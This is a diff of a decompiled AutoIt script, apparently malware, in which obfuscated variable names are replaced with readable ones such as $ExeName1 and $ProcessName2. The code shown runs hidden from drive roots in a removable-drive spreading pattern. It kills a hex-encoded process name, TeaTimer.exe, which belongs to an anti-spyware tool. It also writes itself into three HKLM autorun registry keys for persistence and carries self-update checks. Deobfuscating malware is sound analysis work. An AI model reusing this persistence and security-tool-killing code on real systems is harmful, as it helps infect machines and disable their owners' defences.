@@ -5362,11 +5362,13 @@ Func Fn00ED()
 EndFunc
 
 AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
-$Var028C = "cftuon.exe"
-$Var028D = "cftuon"
-$Var028E = "cftu.exe"
-$Var028F = "cftu"
-If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
+$ExeName1 = "cftuon.exe"
+$ProcessName1 = "cftuon"
+$ExeName2 = "cftu.exe"
+$ProcessName2 = "cftu"
+If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or
+   @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or
+   @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
 	Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
 	If @error Then
 	EndIf
@@ -5375,7 +5377,7 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 		Exit
 	EndIf
 EndIf
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
 	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
 		Exit
 	EndIf
@@ -5556,11 +5558,11 @@ $Var033B = ""
 $Var033C = ""
 $Var033D = ""
 $Var033E = ""
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028E Then
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName2 Then
 	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
 	If ProcessExists($Var0292) Then
 		ProcessClose($Var0292)
 		Sleep(0x01F4)
@@ -5584,35 +5586,35 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028E The
 	EndIf
 	Fn00A4()
 	Fn00A2()
-	$Var02A7 = $Var028E
+	$Var02A7 = $ExeName2
 	Fn00AA()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
 	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $Var028E) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+		If FileGetVersion(@SystemDir & "\" & $ExeName2) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName2)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName2)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName2)
 				Fn00A3()
 			EndIf
 		EndIf
 	EndIf
 	Exit
 EndIf
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
 	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
 	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1)
 				Fn00A3()
 			EndIf
 		EndIf
@@ -5640,17 +5642,17 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C The
 	EndIf
 	Fn00A4()
 	Fn00A2()
-	$Var02A7 = $Var028C
+	$Var02A7 = $ExeName1
 	Fn00A9()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
 	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1)
 				Fn00A3()
 			EndIf
 		EndIf
